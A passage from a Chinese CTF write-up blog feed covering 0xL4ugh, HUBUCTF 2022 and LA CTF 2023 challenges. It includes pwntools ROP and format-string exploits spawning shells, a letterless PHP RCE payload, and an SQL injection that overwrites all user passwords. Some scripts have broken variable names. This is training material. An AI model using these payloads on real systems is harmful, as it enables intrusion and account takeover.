class="hljs-string">&#x27;20&#x27;</span>:<br>      a+=<span class="hljs-string">&#x27;0&#x27;</span><br>    <span class="hljs-keyword">if</span> i == <span class="hljs-string">&#x27;09&#x27;</span>:<br>       a+=<span class="hljs-string">&#x27;1&#x27;</span><br>    <span class="hljs-keyword">if</span> i == <span class="hljs-string">&#x27;0D&#x27;</span>:<br>       a+=<span class="hljs-string">&#x27; &#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a.split(<span class="hljs-string">&#x27; &#x27;</span>):<br>   <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(i)&gt;<span class="hljs-number">2</span>:<br>      <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(i,<span class="hljs-number">2</span>)),end=<span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-comment">#0xL4ugh&#123;F4S5_45_Z4R4K1_B0I&#125;</span><br></code></pre></td></tr></table></figure><h3 id="Colorful"><a href="#Colorful" class="headerlink" title="Colorful"></a>Colorful</h3><h4 id="题目说明-6"><a href="#题目说明-6" class="headerlink" title="题目说明"></a>题目说明</h4><h4 id="解题思路-9"><a href="#解题思路-9" class="headerlink" title="解题思路"></a>解题思路</h4><p><a href="https://www.dcode.fr/hexahue-cipher">https://www.dcode.fr/hexahue-cipher</a><br><code>0xL4ugh&#123;TH1S_15_H3X4HU3_C0D3&#125;</code></p><h3 id="4-Bloody"><a href="#4-Bloody" class="headerlink" title="4.Bloody"></a>4.Bloody</h3><p>just line ? but it contain a lot of infoooooooos</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>img = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./Bloody.png&quot;</span>)<br>flag=<span class="hljs-string">&#x27;&#x27;</span><br>h, w= (img.size)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(h):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(w):<br>        pixel = (img.getpixel((i,j)))<br>        <span class="hljs-keyword">if</span> pixel != (<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,<span class="hljs-number">0</span>):<br>          flag+=<span class="hljs-built_in">chr</span>(pixel[<span class="hljs-number">0</span>])<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;&#125;&#x27;</span> <span class="hljs-keyword">in</span> flag:<br>           <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(flag)<br><span class="hljs-comment">#0xL4ugh&#123;R_G_B_FOR_TH3_W1N&#125;</span><br></code></pre></td></tr></table></figure><h2 id="Osint"><a href="#Osint" class="headerlink" title="Osint"></a>Osint</h2><h3 id="Cat"><a href="#Cat" class="headerlink" title="Cat"></a>Cat</h3><h4 id="题目说明-7"><a href="#题目说明-7" class="headerlink" title="题目说明"></a>题目说明</h4><p>i lost my cat a while ago , and recently i found a photo of it can you help me track my cat by getting the location of this image.<br>flag is in the format: 0xL4ugh{Latitude,Longitude}. Use the 6 digits after the decimal point. (ex: 112.1234567 –&gt; 112.123456)</p><h4 id="解题思路-10"><a href="#解题思路-10" class="headerlink" title="解题思路"></a>解题思路</h4><p>图片左下角<code>Saswat Kumar Dash</code>是摄影师<br>google<code>Saswat Kumar Dash Cat</code><br>通过图片附件的名字找到了一模一样的图<code>[https://www.flickr.com/photos/95789140@N05/10472912333](https://www.flickr.com/photos/95789140@N05/10472912333)</code><br><img src="/mdimg/0xl4/10.png"><br>在网站有拍摄地点<br>在url上显示了经纬度<br><code>[https://www.flickr.com/map/?fLat=29.386886&amp;fLon=47.977166&amp;zl=13&amp;everyone_nearby=1&amp;photo=10472912333](https://www.flickr.com/map/?fLat=29.386886&amp;fLon=47.977166&amp;zl=13&amp;everyone_nearby=1&amp;photo=10472912333)</code><br><code>0xL4ugh&#123;29.386886,47.977166&#125;</code></p><h3 id="Hacker"><a href="#Hacker" class="headerlink" title="Hacker"></a>Hacker</h3><h4 id="题目说明-8"><a href="#题目说明-8" class="headerlink" title="题目说明"></a>题目说明</h4><p>A hacker named z1Luxiboy bypassed our system protection with a Bay pass tool</p><h4 id="解题思路-11"><a href="#解题思路-11" class="headerlink" title="解题思路"></a>解题思路</h4><p><img src="/mdimg/0xl4/11.png"><br><code>[https://www.reddit.com/user/z1Luxiboy/comments/1149mst/%D8%A8%D9%88%D8%B4%D9%83%D8%A7%D9%83_%D9%85%D8%AD%D9%81%D9%88%D8%B8/](https://www.reddit.com/user/z1Luxiboy/comments/1149mst/%D8%A8%D9%88%D8%B4%D9%83%D8%A7%D9%83_%D9%85%D8%AD%D9%81%D9%88%D8%B8/)</code><br><img src="/mdimg/0xl4/12.png"><br><img src="/mdimg/0xl4/13.png"><code>找与这个评论的id相关的 z1Marvelman</code><br>找到github这个b的github<code>[https://github.com/Marvel0x11?tab=repositories](https://github.com/Marvel0x11?tab=repositories)</code><br>有一个骗人的flag<br><code>[https://github.com/Marvel0x11/Baypass-tool/commit/792cc0477af3a8703919133c293877d086908e6a](https://github.com/Marvel0x11/Baypass-tool/commit/792cc0477af3a8703919133c293877d086908e6a)</code><br><img src="/mdimg/0xl4/14.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>比赛Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HUBUCTF 2022 新生赛web</title>
    <link href="/2023/02/16/HUBUCTF%202022%20%E6%96%B0%E7%94%9F%E8%B5%9B-web-wp/"/>
    <url>/2023/02/16/HUBUCTF%202022%20%E6%96%B0%E7%94%9F%E8%B5%9B-web-wp/</url>
    
    <content type="html"><![CDATA[<h1 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">&lt;?php<br>show_source(__FILE__);<br>$username  = <span class="hljs-string">&quot;this_is_secret&quot;</span>; <br>$password  = <span class="hljs-string">&quot;this_is_not_known_to_you&quot;</span>; <br>include(<span class="hljs-string">&quot;flag.php&quot;</span>);//here I changed those two <br>$info = isset($_GET[<span class="hljs-string">&#x27;info&#x27;</span>])? $_GET[<span class="hljs-string">&#x27;info&#x27;</span>]: <span class="hljs-string">&quot;&quot;</span> ;<br>$data_unserialize = unserialize($info);<br><span class="hljs-keyword">if</span> ($data_unserialize[<span class="hljs-string">&#x27;username&#x27;</span>]==$username&amp;&amp;$data_unserialize[<span class="hljs-string">&#x27;password&#x27;</span>]==$password)&#123;<br>    echo $flag;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    echo <span class="hljs-string">&quot;username or password error!&quot;</span>;<br><br>&#125;<br><br>?&gt;<br></code></pre></td></tr></table></figure><p><code>if ($data_unserialize[&#39;username&#39;]==$username&amp;&amp;$data_unserialize[&#39;password&#39;]==$password)&#123; echo $flag; &#125;</code><br>弱比较，令其为true就行，与任何字符串比较都为true<br><img src="/wp/hubuctf/1.png"><br>构造反序列化：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">&lt;?php<br>$info = array(<br><span class="hljs-string">&#x27;username&#x27;</span>=&gt;true,         //布尔类型<br><span class="hljs-string">&#x27;password&#x27;</span>=&gt;true<br>);<br>$serialized_data = serialize($info);<br>echo  $serialized_data ;<br>?&gt;<br><span class="hljs-comment">#a:2:&#123;s:8:&quot;username&quot;;b:1;s:8:&quot;password&quot;;b:1;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/wp/hubuctf/2.png"></p><h1 id="HowToGetShell"><a href="#HowToGetShell" class="headerlink" title="HowToGetShell"></a>HowToGetShell</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">&lt;?php<br>show_source(__FILE__);<br>$mess=$_POST[<span class="hljs-string">&#x27;mess&#x27;</span>];<br><span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/[a-zA-Z]/&quot;</span>,$mess))&#123;<br>    die(<span class="hljs-string">&quot;invalid input!&quot;</span>);<br>&#125;<br><span class="hljs-built_in">eval</span>($mess);<br></code></pre></td></tr></table></figure><p>无字母rce<br>异或构造：<code>$_=&#39;/(/).]/&#39;^&#39;_@_@@;@&#39;;$_();</code>  //phpinfo<br><img src="/wp/hubuctf/3.png"></p><h1 id="Calculate"><a href="#Calculate" class="headerlink" title="Calculate"></a>Calculate</h1><p><img src="/wp/hubuctf/4.png"><br>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> requests<br><br>pattern=<span class="hljs-string">&#x27;&lt;div style=&quot;display:inline;color:#\w&#123;6&#125;&quot;&gt;(.*?)&lt;/div&gt;&#x27;</span> <span class="hljs-comment">#正则获取要计算的数</span><br>url=<span class="hljs-string">&quot;http://43.143.7.97:29000/&quot;</span><br>session=requests.session() <span class="hljs-comment">#获取session</span><br>res=session.post(url)<br>time.sleep(<span class="hljs-number">1</span>) <span class="hljs-comment">#停顿1s</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30</span>):<br>    time.sleep(<span class="hljs-number">1</span>)<br>    result=re.findall(pattern,res.text)<br>    num=<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(result)-<span class="hljs-number">1</span>):<br>        num+=result[i]<br>    ans=<span class="hljs-built_in">eval</span>(num) <span class="hljs-comment">#计算获取的字符串</span><br>    res=session.post(url,data=&#123;<span class="hljs-string">&quot;ans&quot;</span>:ans&#125;)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;NSSCTF&#x27;</span> <span class="hljs-keyword">in</span> res.text:<br>      <span class="hljs-built_in">print</span>(res.text)<br></code></pre></td></tr></table></figure><h1 id="ezsql"><a href="#ezsql" class="headerlink" title="ezsql"></a>ezsql</h1><p><img src="/wp/hubuctf/8.png"><br>尝试sqlmap<br><img src="/wp/hubuctf/5.png"><br>只跑出来我刚注册的账号密码<br>看了大佬的wp知道flag在描述，跑一下<br><img src="/wp/hubuctf/6.png"><br>6<br>只能跟着大佬wp学update注入辣<br>注入点在age<br><img src="/wp/hubuctf/7.png"><br>根据前面跑出来的表，分析<br><img src="/wp/hubuctf/9.png"><br><img src="/wp/hubuctf/10.png"><br><img src="/wp/hubuctf/11.png"><br>这样当前表的所有的用户昵称都改为密码都改为了123<br><code>nickname=aaa&amp;age=666,password=0x3230326362393632616335393037356239363462303731353264323334623730%23&amp;description=666&amp;token=</code><br><code>#0x3230326362393632616335393037356239363462303731353264323334623730=hex(md5(‘123’)) </code><br><img src="/wp/hubuctf/12.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>tplmap安装小记</title>
    <link href="/2023/02/15/tplmap%E5%AE%89%E8%A3%85%E5%8F%8A%E6%8A%A5%E9%94%99%E8%A7%A3%E5%86%B3/"/>
    <url>/2023/02/15/tplmap%E5%AE%89%E8%A3%85%E5%8F%8A%E6%8A%A5%E9%94%99%E8%A7%A3%E5%86%B3/</url>
    
    <content type="html"><![CDATA[<p>浅浅记录一下捏（笑<br>kali：<br>转换为python2：<br><code>sudo update-alternatives --config python</code><br><img src="/note/1/1.png"><br>安装tplmap包：<br><code>git clone https://github.com/epinna/tplmap</code><br><code>cd tplmap</code><br>安装库：<br><code>pip install -r requirements.txt</code><br><img src="/note/1/2.png"><br>报错<br>原因是kali默认只有pip3<br>对pip换源<br><code>pip config set global.index-url [https://pypi.tuna.tsinghua.edu.cn/simple](https://pypi.tuna.tsinghua.edu.cn/simple)</code><br>升级pip：<br><code>pip install --upgrade pip</code><br><img src="/note/1/3.png"><br>23.0为最新<br>安装yaml库:<br><code>python -m pip install pyyaml </code><br><img src="/note/1/4.png"><br>测试：<br><img src="/note/1/5.png"></p>]]></content>
    
    
    <categories>
      
      <category>环境配置</category>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>小记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>LA CTF-wp by Hor1zon</title>
    <link href="/2023/02/14/LA%20CTF/"/>
    <url>/2023/02/14/LA%20CTF/</url>
    
    <content type="html"><![CDATA[<p><strong>题目附件官方：<a href="https://github.com/uclaacm/lactf-archive/tree/master/2023">https://github.com/uclaacm/lactf-archive/tree/master/2023</a></strong></p><p><img src="/img/g.png"></p><p><img src="/mdimg/lactf/640.gif"></p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="metaverse"><a href="#metaverse" class="headerlink" title="metaverse"></a>metaverse</h3><h4 id="题目说明"><a href="#题目说明" class="headerlink" title="题目说明"></a>题目说明</h4><p>Metaenter the metaverse and metapost about metathings. All you have to metado is metaregister for a metaaccount and you’re good to metago.<br><a href="https://metaverse.lac.tf/">https://metaverse.lac.tf/</a><br>You can metause our fancy new metaadmin metabot to get the admin to metaview your metapost!</p><h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4><p>g0at：应该是有人(zhanyi✌)打穿了，鼠鼠直接捡漏，账号密码123就直接进去了捏<br><img src="/mdimg/lactf/1.png"></p><h3 id="college-tour"><a href="#college-tour" class="headerlink" title="college-tour"></a><strong>college-tour</strong></h3><h4 id="题目说明-1"><a href="#题目说明-1" class="headerlink" title="题目说明"></a>题目说明</h4><p>Welcome to UCLA! To explore the #1 public college, we have prepared a scavenger hunt for you to walk all around the beautiful campus.<br><img src="/mdimg/lactf/2.png"></p><h4 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h4><p><img src="/mdimg/lactf/3.png"><br>到处找flag就行了<br><code>lactf&#123;j03_4nd_j0S3phIn3_bRU1n_sAY_hi&#125;</code></p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="rut-roh-relro"><a href="#rut-roh-relro" class="headerlink" title="rut-roh-relro"></a><strong>rut-roh-relro</strong></h3><h4 id="题目说明-2"><a href="#题目说明-2" class="headerlink" title="题目说明"></a>题目说明</h4><p>My friend keeps writing super insecure C programs but I’m too lazy to fix his code. I’m sure it’ll be fine as long as I use enough exploit mitigations, right?<br><code>nc lac.tf 31134</code></p><h4 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&quot;./rut_roh_relro&quot;</span>)<br>p = remote(<span class="hljs-string">&quot;lac.tf&quot;</span>,<span class="hljs-number">31134</span>)<br>elf = ELF(<span class="hljs-string">&quot;./rut_roh_relro&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>context(arch=<span class="hljs-string">&quot;amd64&quot;</span>,os=<span class="hljs-string">&quot;linux&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;terminator&#x27;</span>, <span class="hljs-string">&#x27;--new-tab&#x27;</span>, <span class="hljs-string">&#x27;-x&#x27;</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">src</span>):<br>    gdb.attach(p,src)<br>    pause()<br><br>src = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">b *$rebase(0x11C6)</span><br><span class="hljs-string">b *$rebase(0x1201)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-comment"># dbg(src)</span><br>g=<span class="hljs-string">&quot;%71$p %72$p&quot;</span><br>p.sendlineafter(<span class="hljs-string">&quot;What would you like to post?&quot;</span>,g)<br><br>p.recvuntil(<span class="hljs-string">&quot;Here&#x27;s your latest post:\n&quot;</span>)<br>libc_base = <span class="hljs-built_in">int</span>(r.recvuntil(<span class="hljs-string">&quot; &quot;</span>)[:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>) - <span class="hljs-number">234</span> - libc.symbols[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>success(<span class="hljs-string">&quot;libc_base = &quot;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br><br>stack_addr = <span class="hljs-built_in">int</span>(r.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>)[:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br>ret_stack = stack_addr - <span class="hljs-number">0xf0</span><br>success(<span class="hljs-string">&quot;ret_stack = &quot;</span>+<span class="hljs-built_in">hex</span>(ret_stack))<br><br>start_stack = stack_addr - <span class="hljs-number">0xf0</span> - <span class="hljs-number">0x20</span><br><br>gadget = <span class="hljs-number">0xc967a</span><br>one_gadget = libc_base+gadget<br><br>system_addr = libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>bin_sh = libc_base + libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>).__next__()<br>pop_rdi_ret = libc_base + <span class="hljs-number">0x0000000000023796</span><br><br>g = fmtstr_g(<span class="hljs-number">6</span>, &#123;ret_stack:pop_rdi_ret,ret_stack+<span class="hljs-number">8</span>:bin_sh,ret_stack+<span class="hljs-number">0x10</span>:system_addr&#125;, write_size=<span class="hljs-string">&#x27;byte&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;What would you like to post?&quot;</span>,pg)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p><img src="/mdimg/lactf/4.png"></p><h3 id="redact"><a href="#redact" class="headerlink" title="redact"></a>redact</h3><h4 id="题目说明-3"><a href="#题目说明-3" class="headerlink" title="题目说明"></a>题目说明</h4><p>I heard C was insecure so I wrote my flag redactor program in C++.<br><code>nc lac.tf 31281</code><br>Note: There are multiple optimized implementations of <code>memmove</code> and one is selected at runtime based on available CPU features, meaning that any solution that uses the <code>memmove</code> GOT entry could fail on remote. The challenge is solvable without <code>memmove</code>.</p><h4 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&quot;./redact&quot;</span>)<br>p = remote(<span class="hljs-string">&quot;lac.tf&quot;</span>,<span class="hljs-number">31181</span>)<br>elf = ELF(<span class="hljs-string">&quot;./redact&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>context(arch=<span class="hljs-string">&quot;amd64&quot;</span>,os=<span class="hljs-string">&quot;linux&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;terminator&#x27;</span>, <span class="hljs-string">&#x27;--new-tab&#x27;</span>, <span class="hljs-string">&#x27;-x&#x27;</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">src</span>):<br>    gdb.attach(p,src)<br>    pause()<br><br>src = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">b *0x40149a</span><br><span class="hljs-string">b *0x4012F9</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>pop_rdi_ret = <span class="hljs-number">0x000000000040177b</span><br>pop_rsi_r15_ret = <span class="hljs-number">0x0000000000401779</span><br>start_addr = <span class="hljs-number">0x401120</span><br><br><span class="hljs-comment"># dbg(src)</span><br>g=<span class="hljs-string">&#x27;a&#x27;</span><br>p.sendlineafter(<span class="hljs-string">&quot;Enter some text: &quot;</span>,g)<br><br>g=<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x48</span>+p64(pop_rdi_ret)+p64(<span class="hljs-number">0x4040C0</span>)+p64(pop_rsi_r15_ret)+p64(<span class="hljs-number">0x403FE8</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x4010C0</span>)+p64(start_addr)<br>p.sendlineafter(<span class="hljs-string">&quot;Enter a placeholder: &quot;</span>,g)<br><br>index = <span class="hljs-number">0</span><br>p.sendlineafter(<span class="hljs-string">&quot;Enter the index of the stuff to redact: &quot;</span>,<span class="hljs-built_in">str</span>(index))<br><br>libc_base = u64(r.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\x00&quot;</span>)) - libc.symbols[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>success(<span class="hljs-string">&quot;libc_base = &quot;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br><br>system_addr = libc_base+libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>bin_sh = libc_base+libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>).__next__()<br><br>g=<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x48</span>+p64(pop_rdi_ret)+p64(bin_sh)+p64(system_addr)<br>p.sendlineafter(<span class="hljs-string">&quot;Enter a placeholder: &quot;</span>,g)<br>index = <span class="hljs-number">0</span><br>p.sendlineafter(<span class="hljs-string">&quot;Enter the index of the stuff to redact: &quot;</span>,<span class="hljs-built_in">str</span>(index))<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p><img src="/mdimg/lactf/5.png"></p><h3 id="gatekeep"><a href="#gatekeep" class="headerlink" title="gatekeep"></a>gatekeep</h3><h4 id="题目说明-4"><a href="#题目说明-4" class="headerlink" title="题目说明"></a>题目说明</h4><p>If I gaslight you enough, you won’t be able to get my flag! :)<br><code>nc lac.tf 31121</code><br>Note: The attached binary is the exact same as the one executing on the remote server.</p><h4 id="解题思路-4"><a href="#解题思路-4" class="headerlink" title="解题思路"></a>解题思路</h4><p>g0at：一眼丁真的签到题<br><img src="/mdimg/lactf/6.png"><br>主函数，调用了<code>check()</code>函数，跟一下<br><img src="/mdimg/lactf/7.png"><br>逻辑也很简单，让猜密码，密码正确就可以<code>print_flag()</code>但是<code>gets()</code>这里有很明显的溢出，可以看到<code>char s1[15]</code>，所以我们只要输入一个大的数就可以直接绕过<code>check()</code>函数，直接cat flag<br><img src="/mdimg/lactf/9.png"></p><h3 id="bot"><a href="#bot" class="headerlink" title="bot"></a>bot</h3><h4 id="题目说明-5"><a href="#题目说明-5" class="headerlink" title="题目说明"></a>题目说明</h4><p>I made a bot to automatically answer all of your questions.<br><code>nc lac.tf 31180</code></p><h4 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&quot;lac.tf&quot;</span>, <span class="hljs-number">31180</span>)<br>p.recv()<br>g = <span class="hljs-string">b&quot;may i have the flag?\0&quot;</span><br>g += <span class="hljs-string">b&quot;A&quot;</span>*(<span class="hljs-number">64</span>-<span class="hljs-built_in">len</span>(g))<br>g += <span class="hljs-string">b&#x27;BBBBBBBB&#x27;</span><br>g += p64(<span class="hljs-number">0x40129a</span>)<br>p.sendline(g)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="caterpillar"><a href="#caterpillar" class="headerlink" title="caterpillar"></a>caterpillar</h3><h4 id="题目说明-6"><a href="#题目说明-6" class="headerlink" title="题目说明"></a>题目说明</h4><p>-<del>-</del>-<del>-</del>[]? -<del>-</del>-<del>-</del>[].</p><h4 id="解题思路-5"><a href="#解题思路-5" class="headerlink" title="解题思路"></a>解题思路</h4><p>附件为js文件，简言之可以理解为对flag逐一判断是否等于某个值。图中的 <strong>-~[]</strong> 这样的书写形式很特别，猜测可能代表常量？于是在浏览器console解析，发现可以解析为整数常量。那么思路显而易见，把if中代码改成赋值语句即可。<br><img src="/mdimg/lactf/10.png"><br><img src="/mdimg/lactf/11.png"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> flag = <span class="hljs-title class_">Array</span>(<span class="hljs-number">55</span>).<span class="hljs-title 